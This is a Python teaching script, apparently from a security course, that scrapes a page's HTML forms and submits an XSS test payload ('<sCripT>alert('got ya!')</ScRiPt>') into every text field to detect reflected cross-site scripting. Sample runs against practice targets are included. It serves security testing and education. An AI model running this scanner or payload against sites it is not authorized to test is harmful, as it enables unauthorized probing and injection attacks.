#!/usr/bin/env python3

# Author:      Abdou Rockikz
# Description: XSS Scanning Script
# Date:        11-24-2021
# Modified by: Bill Kachersky

### TODO: Install requests bs4 before executing this in Python3

# Import libraries

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

# Declare functions

# This function parses the forms from the HTML content of any webpage the script is ran against and turns the forms into soup objects.
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

# This function extracts all details about an HTML form
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Now that we have the form details, this function allows us to submit a form.
def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


# At this point we have everything we need in place with the previous functions to extract the data needed from the forms on a webpage, and then submit them.
# Now we can scan for XSS vulnerabilities!
def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<sCripT>alert('got ya!')</ScRiPt>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable



# Main

# This main section is where user input can be consumed by the script, which will in turn execute its functions against the target specified by the user input
# Once a URL has been supplied, the script will grab all the HTML forms, print the number of forms it finds, then iterate over the forms, and submit the forms
# The script will submit the forms with the value supplied by our js_script variable into all text and search input fields.
# If the Javascript code is able to be injected and executed successfully, then we should get a pop up with the specified message, this will confirm that the 
# page is vulnerable to XSS.


if __name__ == "__main__":
    url = input("Enter a URL to test for XSS:") 
    print(scan_xss(url))




######## POSITIVE RESULT

# dojo@dojo-VirtualBox:~/Desktop/class-38$ ./401ops38.py
# Enter a URL to test for XSS:https://xss-game.appspot.com/level1/frame
# [+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
# [+] XSS Detected on https://xss-game.appspot.com/level1/frame
# [*] Form details:
# {'action': '',
#  'inputs': [{'name': 'query',
#              'type': 'text',
#              'value': "<sCripT>alert('got ya!')</ScRiPt>"},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# True



######## NEGATIVE RESULT

# dojo@dojo-VirtualBox:~/Desktop/class-38$ ./401ops38.py
# Enter a URL to test for XSS:http://dvwa.local/login.php
# [+] Detected 1 forms on http://dvwa.local/login.php.
# False


# End